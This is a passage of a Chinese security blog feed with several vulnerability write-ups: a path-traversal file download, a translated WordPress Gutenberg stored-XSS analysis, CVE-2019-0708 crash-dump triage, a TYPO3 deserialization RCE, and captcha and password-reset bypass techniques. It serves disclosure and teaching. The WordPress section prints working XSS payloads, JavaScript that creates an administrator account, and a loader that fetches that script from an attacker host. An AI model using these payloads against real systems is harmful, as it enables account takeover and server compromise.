class="headerlink" title="04漏洞复现"></a>04漏洞复现</h2><p>在复现之前需要找到从什么地方调用到了download.php,在经过测试之后发现通过这个URL提交就能够利用漏洞下载到config.php文件,但是首先需要登录后台。URL如下:<br><a href="http://127.0.0.1:8080/admin/inicio.php?include=php/download.php&amp;name=efe.php&amp;file=../config.php，如图7所示。" target="_blank" rel="noopener">http://127.0.0.1:8080/admin/inicio.php?include=php/download.php&amp;name=efe.php&amp;file=../config.php，如图7所示。</a></p><p><img src="https://pic3.zhimg.com/v2-18183c286be55b1b067a55f89ca4deaa_r.jpg" alt></p><p>图7下载config.php</p><p>当然既然是任意文件下来漏洞肯定可以下载windows目录下面的win.ini文件，使用URL为:<br><a href="http://127.0.0.1:8080/admin/inicio.php?include=php/download.php&amp;name=efe.php&amp;file=../../../../Windows/win.ini。执行后就能够下载文件了。如图8所示。" target="_blank" rel="noopener">http://127.0.0.1:8080/admin/inicio.php?include=php/download.php&amp;name=efe.php&amp;file=../../../../Windows/win.ini。执行后就能够下载文件了。如图8所示。</a></p><p><img src="https://pic4.zhimg.com/v2-fddb74e5019196975e2663db99b48ff3_r.jpg" alt></p><p>图8下载win.ini</p><p>##05修复建议<br>根据前文的描述能够看出，漏洞存在一定的危害。应该对于漏洞进行修复，关于如何去修复漏洞。</p><p>1.过滤点[.]要求用户在url中不能回溯上级目录。<br>2.正则严格判断用户输入参数的格式，保证输入参数的准确性。<br>3.将下载区独立放在项目路径外，分配每个下载资源固定的URL,不能是所有的下载资源都是统一的URL：<br><a href="http://127.0.0.1:8080/admin/inicio.php?include=php/download.php&amp;name=efe.php&amp;file=文件名" target="_blank" rel="noopener">http://127.0.0.1:8080/admin/inicio.php?include=php/download.php&amp;name=efe.php&amp;file=文件名</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WordPress存储型XSS漏洞分析</title>
      <link href="/2019/12/07/%E6%BC%8F%E6%B4%9E%E6%90%9C%E9%9B%86/WordPress%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2019/12/07/%E6%BC%8F%E6%B4%9E%E6%90%9C%E9%9B%86/WordPress%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p><strong>译文声明<br>本文是翻译文章，文章原作者fortinet，文章来源：fortinet.com<br>原文地址：<a href="https://www.fortinet.com/blog/threat-research/wordpress-core-stored-xss-vulnerability.html" target="_blank" rel="noopener">https://www.fortinet.com/blog/threat-research/wordpress-core-stored-xss-vulnerability.html</a><br>译文仅供参考，具体内容表达以及含义原文为准</strong></p><p><img src="https://p3.ssl.qhimg.com/t0154214347380ba2a2.png" alt> </p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>WordPress是世界上最流行的CMS（内容管理系统），占据全球60.4%的市场份额，这个数字远远高于第二名的Joomla!（5.2%的市场份额）。因此，在互联网上有超过三分之一的网站采用WordPress构建。</p><p>FortiGuard Labs团队最近在WordPress中发现了一个存储型XSS（Cross-Site Scripting）0day漏洞，这个XSS漏洞位于WordPress 5.0新增的Gutenberg编辑器中，该编辑器无法正确过滤Shortcode（短代码）错误消息中的JavaScript/HTML代码。如果远程攻击者具备Contributor（贡献者）或者更高权限，当受害者访问被攻击的网页时，攻击者就可以在受害者浏览器上下文中执行任意JavaScript/HTML代码。如果受害者具备更高权限（比如管理员权限），攻击者甚至可以攻破整个web服务器。</p><p>这个存储型XSS漏洞影响5.0至5.2.2版的WordPress。</p><h2 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h2><p>在WordPress 5.0中，用户可以在文章（post）中添加Shortcode块（block）。当在Shortcode块中添加特定的HTML编码字符（比如&lt;）然后重新打开该文章时，WordPress就会显示一个错误消息，将&lt;解码成&lt;然后展示预览。</p><p><img src="https://p5.ssl.qhimg.com/t018c8ac1b86a6e22ac.png" alt><br>图1. 在Shortcode块中插入HTML编码字符</p><p><img src="https://p1.ssl.qhimg.com/t0113d0da196199b259.png" alt><br>图2. Shortcode错误消息预览</p><p>我们可以使用<strong>“&gt;&lt;img src=1 onerror=prompt(1)&gt;</strong>这段PoC代码轻松绕过预览视图中的XSS过滤器。</p><p><img src="https://p1.ssl.qhimg.com/t0113d0da196199b259.png" alt><br>图3. 将PoC代码插入Shortcode块</p><p>当受害者查看该文章时，就会在浏览器中执行XSS代码。</p><p><img src="https://p3.ssl.qhimg.com/t010226398ebf02fdd8.png" alt><br>图4. WordPress Shortcode预览XSS</p><p>如果受害者刚好具备管理员权限，那么攻击者就可以利用该漏洞来获取管理员账户的控制权，利用WordPress内置的函数拿到shell，进一步控制整个服务器。</p><p>比如，攻击者可以在自己的web服务器上托管一个JavaScript文件（这里以wpaddadmin.js为例），这段JavaScript代码会添加一个WordPress管理员账户，用户名为attack，密码为attack。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// Send a GET request to the URL &apos;/wordpress/wp-admin/user-new.php&apos;, and extract the current &apos;nonce&apos; value  </span><br><span class="line">var ajaxRequest = new XMLHttpRequest();  </span><br><span class="line">var requestURL = &quot;/wordpress/wp-admin/user-new.php&quot;;  </span><br><span class="line">var nonceRegex = /ser&quot; value=&quot;([^&quot;]*?)&quot;/g;  </span><br><span class="line">ajaxRequest.open(&quot;GET&quot;, requestURL, false);  </span><br><span class="line">ajaxRequest.send();  </span><br><span class="line">var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);  </span><br><span class="line">var nonce = nonceMatch[1];  </span><br><span class="line"></span><br><span class="line">// Construct a POST query, using the previously extracted &apos;nonce&apos; value, and create a new user with an arbitrary username / password, as an Administrator  </span><br><span class="line">var params = &quot;action=createuser&amp;_wpnonce_create-user=&quot;+nonce+&quot;&amp;user_login=attacker&amp;email=attacker@site.com&amp;pass1=attacker&amp;pass2=attacker&amp;role=administrator&quot;;  </span><br><span class="line">ajaxRequest = new XMLHttpRequest();  </span><br><span class="line">ajaxRequest.open(&quot;POST&quot;, requestURL, true);  </span><br><span class="line">ajaxRequest.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);  </span><br><span class="line">ajaxRequest.send(params);</span><br></pre></td></tr></table></figure><p>然后攻击者可以使用如下PoC来插入JavaScript。</p><p><code>&quot;&amp;gt;&amp;lt;img src=1 onerror=&quot;javascript&amp;colon;(function () { var url = &#39;http://aaa.bbb.ccc.ddd/ wpaddadmin.js&#39;;if (typeof beef == &#39;undefined&#39;) { var bf = document.createElement(&#39;script&#39;); bf.type = &#39;text/javascript&#39;; bf.src = url; document.body.appendChild(bf);}})();&quot;&amp;gt;</code><br><img src="https://p3.ssl.qhimg.com/t01ff29771459e602b0.png" alt><br>图5. 插入XSS代码以添加管理员账户</p><p>一旦具备高权限的受害者查看该文章，就会创建attacker管理员账户。<br><img src="https://p4.ssl.qhimg.com/t010e42abaa7fcc8d89.png" alt><br>图6. 执行XSS代码</p><p><img src="https://p4.ssl.qhimg.com/t013e0fbc54e4f4a6c4.png" alt><br>图7. XSS代码成功创建具备管理员权限的attacker账户</p><p>随后攻击者可以修改已有的php文件，改成webshell代码，以便接管目标web服务器。</p><p><img src="https://p0.ssl.qhimg.com/t0131da4b3ea2ca7c86.png" alt></p><p>图8. 使用攻击者账户添加webshell</p><p><img src="https://p1.ssl.qhimg.com/t01c0b5cda440e3cf4b.png" alt><br>图9. 控制web服务器</p><h2 id="0x02-解决方案"><a href="#0x02-解决方案" class="headerlink" title="0x02 解决方案"></a>0x02 解决方案</h2><p>FortiGuard Labs向WordPress反馈了这个0day漏洞，官方很快发布了相应补丁。如果大家正在使用存在漏洞的WordPress版本，请尽快升级到最新版，或者及时打上补丁。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>简单判断是否是cve-2019-0708攻击</title>
      <link href="/2019/12/07/%E6%BC%8F%E6%B4%9E%E6%90%9C%E9%9B%86/cve-20190-0708/"/>
      <url>/2019/12/07/%E6%BC%8F%E6%B4%9E%E6%90%9C%E9%9B%86/cve-20190-0708/</url>
      
        <content type="html"><![CDATA[<p>文章转自<a href="https://mp.weixin.qq.com/s?__biz=MzA4NjQxMDcxNA==&amp;mid=2709352684&amp;idx=1&amp;sn=0e845ce5ee2c7f210d89e1566b39e0e5" title="中国白客联盟" target="_blank" rel="noopener">中国白客联盟</a></p><hr><p>今早一起床，发现cve-2019-0708 exp已经公开。但是作为安服人员，攻击是一回事，应急又是另一大回事。这里就简单来判断受害者机器是否受到了cve-2019-0708攻击。</p><p>因为cve-2019-0708这类是溢出类攻击，所以跟ms17-010、ms12-020一样，有一定的几率把机器打蓝屏，这里以蓝屏文件为例作为分析。</p><p>首先安装windbg，添加符号表<br><img src="https://tva1.sinaimg.cn/large/005R6Otmly1g6tf36icqcj30nd08mq53.jpg" alt><br><code>set _NT_SYMBOL_PATH=srv*DownstreamStore*https://msdl.microsoft.com/download/symbols</code><br>打开蓝屏文件，我的win7默认在<br><code>C:\Windows\Minidump</code></p><p>首先我利用cve-2019-0708把我机器打蓝屏，打开该蓝屏dmp文件，关注debug session time、system uptime，可以看到该机器运行了4分钟，在10:00左右出现蓝屏事件：<br><img src="https://ws3.sinaimg.cn/large/005R6Otmly1g6tf36pi9wj30mu05g767.jpg" alt><br>输入</p><p><code>!analyze -v</code><br>看到蓝屏代码<br><img src="https://ws4.sinaimg.cn/large/005R6Otmly1g6tf36v2gpj30o302y0tc.jpg" alt><br>蓝屏代码造成原因：</p><p><img src="https://ws4.sinaimg.cn/large/005R6Otmly1g6tf37055uj30mn01kt90.jpg" alt></p><p>关注PROCESS_NAME，代表导致系统蓝屏的进程：</p><p><img src="https://ws4.sinaimg.cn/large/005R6Otmly1g6tf37fasyj30nh05vwfy.jpg" alt></p><p>FOLLOWUP_IP，错误指令位置</p><p><img src="https://ws4.sinaimg.cn/large/005R6Otmly1g6tf37md3jj30o704faas.jpg" alt></p><p>查看出错驱动，rdpwd.sys，可以通过网上搜索对应漏洞分析文章，查看对用的驱动是否受影响<br><code>lmvm RDPWD</code><br><img src="https://ws4.sinaimg.cn/large/005R6Otmly1g6tf38grlmj30ns07mq6d.jpg" alt></p><p>这是ms12-020打的</p><p><img src="https://ws1.sinaimg.cn/large/005R6Otmly1g6tf38ol3sj30n9024wfc.jpg" alt></p><p>这是ms17-010打的<br><img src="https://ws4.sinaimg.cn/large/005R6Otmly1g6tf38vddfj30mx05ygmg.jpg" alt></p><p>可见不同的攻击手法得到的蓝屏文件结果不一样的，因此可以通过分析蓝屏文件来判断是否受到了哪种攻击。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-12747：TYPO3 9.5.7 RCE漏洞分析</title>
      <link href="/2019/12/07/%E6%BC%8F%E6%B4%9E%E6%90%9C%E9%9B%86/CVE-2019-12747%EF%BC%9ATYPO3%209.5.7%20RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2019/12/07/%E6%BC%8F%E6%B4%9E%E6%90%9C%E9%9B%86/CVE-2019-12747%EF%BC%9ATYPO3%209.5.7%20RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p><strong>译文声明:<br>本文是翻译文章，文章原作者ripstech，文章来源：blog.ripstech.com<br>原文地址：<a href="https://blog.ripstech.com/2019/typo3-overriding-the-database" target="_blank" rel="noopener">https://blog.ripstech.com/2019/typo3-overriding-the-database</a><br>译文仅供参考，具体内容表达以及含义原文为准</strong><br><img src="https://p2.ssl.qhimg.com/t01cb51d1cb54b0010f.png" alt></p><h2 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h2><p>在本文中，我们研究TYPO3 CMS的核心中的一个关键漏洞，该漏洞通过代码审计挖掘而出。该漏洞使得经过身份验证的用户能够在底层系统上执行任意PHP代码。</p><p>受该漏洞影响的版本是TYPO3 8.x到8.7.26，以及TYPO3 9.x到9.5.7。对不可信数据的反序列化会导致远程代码执行漏洞，该漏洞可以与后端中检测到的跨站脚本漏洞(CVE-2019-12748)相结合。</p><p>RIP扫描报告（<a href="https://demo.ripstech.com/scan/109/165）" target="_blank" rel="noopener">https://demo.ripstech.com/scan/109/165）</a></p><h2 id="0x02-使用payload覆盖数据库"><a href="#0x02-使用payload覆盖数据库" class="headerlink" title="0x02 使用payload覆盖数据库"></a>0x02 使用payload覆盖数据库</h2><p>在TYPO3的后端部分保存任何表单时将会发生此漏洞。例如，如果用户修改了pages部分，则可以从TYPO3的SQL数据库中提取要编辑的数据并将其写回数据库。在从数据库获取数据之后，应用逻辑允许通过用户的输入覆盖所获取数据的单列。此特征允许经过身份验证的恶意后端用户覆盖包含序列化数据的数据库值，这些数据稍后会反序列化。这将会导致PHP对象注入，最终攻击者可以远程执行代码（CVE-2019-12747）。</p><p>攻击视频（<a href="https://blog.ripstech.com/videos/typo3_957.mp4）" target="_blank" rel="noopener">https://blog.ripstech.com/videos/typo3_957.mp4）</a></p><h2 id="0x03-技术细节"><a href="#0x03-技术细节" class="headerlink" title="0x03 技术细节"></a>0x03 技术细节</h2><p>在TYPO3中保存后端表单时，将调用$formDataCompiler对象的compile()方法。参数是一个使用用户输入填充的数组，如下第8行所示。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">typo3/sysext/backend/Classes/Controller/EditDocumentController.php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">  $this-&gt;overrideVals = $parsedBody[&apos;overrideVals&apos;] ?? </span><br><span class="line">    $queryParams[&apos;overrideVals&apos;] ?? null;</span><br><span class="line">  // ... </span><br><span class="line">  $formDataCompilerInput[&apos;overrideValues&apos;] = $this-&gt;overrideVals[$table];</span><br><span class="line">  $formData = $formDataCompiler-&gt;compile($formDataCompilerInput);</span><br></pre></td></tr></table></figure><p>该方法使用for-loop遍历一个有序的FormDataProvider对象列表，并按顺序在每个$provider对象上调用addData()方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">typo3/sysext/backend/Classes/Form/FormDataGroup/OrderedProviderList.php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">public function compile(array $result): array</span><br><span class="line">&#123;</span><br><span class="line">  // ...</span><br><span class="line">  foreach ($orderedDataProvider as $providerClassName =&gt; $providerConfig) &#123;</span><br><span class="line">    // ...</span><br><span class="line">    $result = $provider-&gt;addData($result);</span><br><span class="line">  &#125;</span><br><span class="line">  return $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如上代码的第9行，$provider-&gt;addData()的参数$result在下面的addData()方法调用作为其参数。在每次迭代时，变量$result表示数组在$provider处理完其内容后被修改。其中一个providers是DatabaseRecordOverrideValues类的一个实例，该类允许覆盖从数组$result中提取的数据，其中数组的行列值分别为databaseRow和任意key值。</p><p>typo3/sysext/backend/Classes/Form/FormDataProvider/DatabaseRecordOverrideValues.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">public function addData(array $result)</span><br><span class="line">&#123;</span><br><span class="line">    foreach ($result[&apos;overrideValues&apos;] as $fieldName =&gt; $fieldValue) &#123;</span><br><span class="line">        if (isset($result[&apos;processedTca&apos;][&apos;columns&apos;][$fieldName])) &#123;</span><br><span class="line">            $result[&apos;databaseRow&apos;][$fieldName] = $fieldValue;</span><br><span class="line">            // ...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后，下列FormDataProvider对象之一实现了unserialize()方法对被覆盖数据的调用，从而导致漏洞：</p><p>typo3/sysext/backend/Classes/Form/FormDataProvider/DatabaseLanguageRows.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">public function addData(array $result)</span><br><span class="line">&#123;</span><br><span class="line">  // ...</span><br><span class="line">  if (/*...*/) </span><br><span class="line">  &#123;</span><br><span class="line">    $result[&apos;defaultLanguageDiffRow&apos;][$defaultLanguageKey] = unserialize(</span><br><span class="line">        $result[&apos;databaseRow&apos;][$result[&apos;processedTca&apos;][&apos;ctrl&apos;]</span><br><span class="line">        [&apos;transOrigDiffSourceField&apos;]]);</span><br></pre></td></tr></table></figure></p><p>这里是有关如何通过工具链expoit PHP对象注入的更多信息的链接： （<a href="https://blog.ripstech.com/2018/php-object-injection）" target="_blank" rel="noopener">https://blog.ripstech.com/2018/php-object-injection）</a></p><h2 id="0x04-CVE-2019-12748：在后端的存储型XSS"><a href="#0x04-CVE-2019-12748：在后端的存储型XSS" class="headerlink" title="0x04 CVE-2019-12748：在后端的存储型XSS"></a>0x04 CVE-2019-12748：在后端的存储型XSS</h2><p>CMS TYPO3的后端中存在跨站脚本漏洞（CVE-2019-12748）。有权访问Site Redirects部分的非特权用户可以利用t3://伪协议注入一个恶意的URL。<br><code>t3://url/?url=javascript:alert(1);</code><br>通过添加这个特定的站点，可以重定向另一个拥有更高权限的TYPO3用户，从而诱使他们点击触发恶意JavaScript的链接。攻击者可以将此漏洞作为启动远程代码执行漏洞攻击的支点。</p><p>TYPO3会阻止用户利用链接和URL中危险的javascript:伪协议，这意味着TYPO3将直接执行JavaScript。但是，它并不阻止用户利用TYPO3的内置t3://伪协议，该协议实现了多种功能，例如引用TYPO3内部页面，文件，邮件地址或URLs。实际上，指定一个自动转换为可点击链接的URL将绕过TYPO3的白名单，该白名单最初的作用是阻止javascript:伪协议。</p><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>本文所述的漏洞会对具有一个或多个TYPO3后端的用户的TYPO3系统产生严重的影响。经过身份验证并且可以访问Pages部分的后端用户可以在底层远程系统上执行代码。攻击者可以利用Site Redirects模块中的跨站脚本漏洞作为利用此漏洞的支点。</p><h2 id="0x06-时间线"><a href="#0x06-时间线" class="headerlink" title="0x06 时间线"></a>0x06 时间线</h2><p>2019年5月9日：提交漏洞<br>2019年5月9日：漏洞确认<br>2019年5月10日：与厂商安全负责人协调解决问题<br>2019年6月6日：厂商通知6月25号发布补丁<br>2019年6月25日：TYPO3 9.5.8补丁发布</p><h2 id="0x07-参考文献"><a href="#0x07-参考文献" class="headerlink" title="0x07 参考文献"></a>0x07 参考文献</h2><p>WordPress 5.1 CSRF to Remote Code Execution：</p><p><a href="https://blog.ripstech.com/2019/wordpress-csrf-to-rce" target="_blank" rel="noopener">https://blog.ripstech.com/2019/wordpress-csrf-to-rce</a></p><p>Magento 2.3.1: Unauthenticated Stored XSS to RCE：</p><p><a href="https://blog.ripstech.com/2019/magento-rce-via-xss" target="_blank" rel="noopener">https://blog.ripstech.com/2019/magento-rce-via-xss</a></p><p>MyBB &lt;= 1.8.20: From Stored XSS to RCE：</p><p><a href="https://blog.ripstech.com/2019/mybb-stored-xss-to-rce" target="_blank" rel="noopener">https://blog.ripstech.com/2019/mybb-stored-xss-to-rce</a></p><p>WordPress 5.0.0 Remote Code Execution：</p><p><a href="https://blog.ripstech.com/2019/wordpress-image-remote-code-execution" target="_blank" rel="noopener">https://blog.ripstech.com/2019/wordpress-image-remote-code-execution</a></p><p>CTF Writeup: Complex Drupal POP Chain：</p><p><a href="https://blog.ripstech.com/2019/complex-drupal-pop-chain" target="_blank" rel="noopener">https://blog.ripstech.com/2019/complex-drupal-pop-chain</a></p><p>本文翻译自 blog.ripstech.com， 原文链接 。如若转载请注明出处。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>验证码绕过、密码找回漏洞</title>
      <link href="/2019/12/07/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%E3%80%81%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/12/07/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%E3%80%81%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="验证码作用"><a href="#验证码作用" class="headerlink" title="验证码作用"></a>验证码作用</h2><p>验证码（CAPTCHA）是“Completely Automated Public Turing test to tell Computers and Humans Apart”（全自动区分计算机和人类的图灵测试）的缩写，是一种区分用户是计算机还是人的公共全自动程序。</p><p>可以防止：恶意破解密码、刷票、论坛灌水，有效防止某个黑客对某一个特定注册用户用特定程序暴力破解方式进行不断的登陆尝试，实际上用验证码是现在很多网站通行的方式，我们利用比较简易的方式实现了这个功能。这个问题可以由计算机生成并评判，但是必须只有人类才能解答。</p><p>由于计算机无法解答CAPTCHA的问题，所以回答出问题的用户就可以被认为是人类。</p><p>验证码的种类很多，有滑块验证，纯数字验证，点击字符，数字运算等……<br>而我们能有效的利用验证码防止恶意破解密码、刷票、论坛灌水、刷页。</p><h2 id="验证码常见的绕过姿势"><a href="#验证码常见的绕过姿势" class="headerlink" title="验证码常见的绕过姿势"></a>验证码常见的绕过姿势</h2><h3 id="验证码不失效"><a href="#验证码不失效" class="headerlink" title="验证码不失效"></a>验证码不失效</h3><ul><li>造成原因：找回密码的时候获取的验证码缺少时间限制仅值判断了验证码是够正确未判断验证码是否过期。</li><li>测试方法：通过枚举找到真正的验证码输入验证码完成验证。</li></ul><p>###验证码重复使用<br>验证码可以多次重复，如果现在的验证码为1106，如果登录失了，验证码会换但是输入1106，还是判定验证码正确；<a href="http://www.anquan.us/static/bugs/wooyun-2016-0169672.html" target="_blank" rel="noopener">案例</a></p><h3 id="未校验用户字段的值"><a href="#未校验用户字段的值" class="headerlink" title="未校验用户字段的值"></a>未校验用户字段的值</h3><ul><li>造成原因：在整个重置密码的流程中，只对验证码和手机号做了校验，未对后面设置新密码的用户身份做判断，导致在最后一步通过修改用户身份来重置他人的密码。</li><li>测试方法：使用自己的手机号走流程，在走到最后一个设置密码的流程时，修改数据包里的用户信息。<h3 id="前端验证验证码"><a href="#前端验证验证码" class="headerlink" title="前端验证验证码"></a>前端验证验证码</h3></li><li>造成原因：只在前端进行验证没有进行后端验证</li><li>测试方法：直接抓包进行跑数据包，反正没验证码的阻碍。<h3 id="修改密码处id可替换"><a href="#修改密码处id可替换" class="headerlink" title="修改密码处id可替换"></a>修改密码处id可替换</h3></li><li>造成原因：修改密码的时候，没有对原密码进行判断，且根据id的值来修改用户的密码，类似的SQL语句：update user set  password=”qwer1234” where id = ‘1’修改数据包里的id的值，即可修改他人密码。</li><li>测试方法：修改自己用户密码，抓取数据包，替换数据包中用户对应的id值，即可修改他人的密码。<h3 id="验证码无校验"><a href="#验证码无校验" class="headerlink" title="验证码无校验"></a>验证码无校验</h3></li><li>造成原因：设置了验证码，但却没有校验(真是扯淡……估计开发会被老板砍死)</li><li>测试方法：乱输验证码进行验证即可。<h3 id="验证码空值绕过"><a href="#验证码空值绕过" class="headerlink" title="验证码空值绕过"></a>验证码空值绕过</h3></li><li>造成原因：没对验证码参数进行强制条件，如我们发现登录参数是user=admin&amp;psw=123456&amp;yzm=1312，将验证码传参去掉，留下user=admin&amp;psw=123456就可以绕过验证码机制。</li><li>测试方法：抓包，如看到类似验证码参数，将其去掉，进行发包。<h3 id="验证码可控制"><a href="#验证码可控制" class="headerlink" title="验证码可控制"></a>验证码可控制</h3></li><li>造成原因：有时候验证码通过url传参，就是说我们参数可控，而验证码是通过参数设定的。</li><li>测试方法：直接将参数设置成固定，那么可能验证码就不会变</li></ul><p><strong>绕过姿势有很多种，这里只是给大家介绍几种，能帮助更好的了解此漏洞。</strong></p><h2 id="密码找回漏洞"><a href="#密码找回漏洞" class="headerlink" title="密码找回漏洞"></a>密码找回漏洞</h2><p>有一类验证码，他并不是区分用户是计算机还是人的公共全自动程序，它是用来证明你的身份，比如你登入微信，支付宝，支持短信验证登入，像这类验证码实际上是用来区分你的身份的。<br>当你qq密码忘记密码时候，你需要找回密码，然后他要求把APP现实的动态密码填入框内，一般而言手机验证码都由5-30分钟，如果他没有做尝试限制的话我们是不是可以进行穷举？然后直接跑出验证码就能修改他人的密码？</p><p>第一种就是找回密码，往邮箱发送明文或密码后者验证码(手机短信验证就是玩你的手机发送验证码)通过这样的方式来判断是否是本人</p><p>第二种发送一个重置密码的链接到你的绑定邮箱去，点击则重置密码；</p><h3 id="密码找回漏洞例子"><a href="#密码找回漏洞例子" class="headerlink" title="密码找回漏洞例子"></a>密码找回漏洞例子</h3><ul><li>验证码发送后前端返回<a href="http://www.anquan.us/static/bugs/wooyun-2016-0172266.html" target="_blank" rel="noopener">安利</a></li><li>验证码无次数限制可爆破</li><li>验证码可控<a href="http://www.anquan.us/static/bugs/wooyun-2014-086716.html" target="_blank" rel="noopener">安利</a></li><li>直接修改密码页面<a href="http://www.anquan.us/static/bugs/wooyun-2013-040908.html" target="_blank" rel="noopener">安利</a></li><li>缺失身份——&gt;绑定别人的手机号到自己的手机<a href="http://www.anquan.us/static/bugs/wooyun-2013-016896.html" target="_blank" rel="noopener">安利</a></li><li>越权漏洞——&gt;自己验证码通过改包然后修改他们密码</li></ul><h2 id="靶场实例"><a href="#靶场实例" class="headerlink" title="靶场实例"></a>靶场实例</h2><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3pbn3k3ewj31h80q37gc.jpg" alt><br>我们看到这是一个后台管理页面，在这里我们可以看到有一个密码找回，他是通过管理员邮箱来找回的，我们可以通过社工和社区寻找管理员的邮箱。</p><p>在这里我们已经找到邮箱了<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3pbne7ztuj30ir09ddfu.jpg" alt></p><p>我们通过审计代码发现认证码是在10-10000的随机数，那如果它没有输入认证码次数限制，那我们可不可以通过爆破来爆出认证码。<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3si8n7bwqj30t30i1jxq.jpg" alt><br>我们通过burp抓包<br>进行爆破<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3pbo8p3hxj31gz0q9ah4.jpg" alt></p><p>成功爆破出认证码<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3pbp05856j30kz09jabl.jpg" alt></p><p>我们进行登录<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3sj2ny46ij31h20msafk.jpg" alt="https://tva1.sinaimg.cn/large/007rAy9hgy1g3sj2ny46ij31h20msafk.jpg"><br>发现登录成功</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>文件上传解析漏洞——解析、验证、伪造（三）</title>
      <link href="/2019/12/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E3/"/>
      <url>/2019/12/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E3/</url>
      
